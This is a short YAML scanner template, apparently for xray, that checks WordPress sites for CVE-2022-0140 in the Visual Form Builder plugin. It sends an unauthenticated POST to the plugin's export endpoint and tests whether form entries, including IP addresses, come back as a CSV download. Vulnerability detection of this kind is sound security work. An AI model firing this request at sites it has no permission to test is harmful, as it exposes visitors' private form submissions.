name: poc-yaml-wordpress-visual-form-builder-cve-2022-0140-info-leak
manual: true
transport: http
set:
    RootURL: response.url.scheme + "://" + response.url.domain
rules:
    r0:
        request:
            cache: true
            method: POST
            path: /wp-admin/admin.php?page=vfb-export
            headers:
                Content-Type: application/x-www-form-urlencoded
                Origin: '{{RootURL}}'
                Referer: '{{RootURL}}/wp-admin/admin.php?page=vfb-export'
            body: vfb-content=entries&format=csv&entries_form_id=1&entries_start_date=0&entries_end_date=0&submit=Download+Export+File
            follow_redirects: false
        expression: response.status == 200 && response.body_string.contains("\"Date Submitted\"") && response.body_string.contains("\"Entries ID\"") && response.body_string.contains("\"IP Address\"") && response.headers["Content-Disposition"].contains("attachment")
expression: r0()
detail:
    author: Â∞èz
    links:
        - https://wpscan.com/vulnerability/9fa2b3b6-2fe3-40f0-8f71-371dd58fe336
    vulnerability:
        level: medium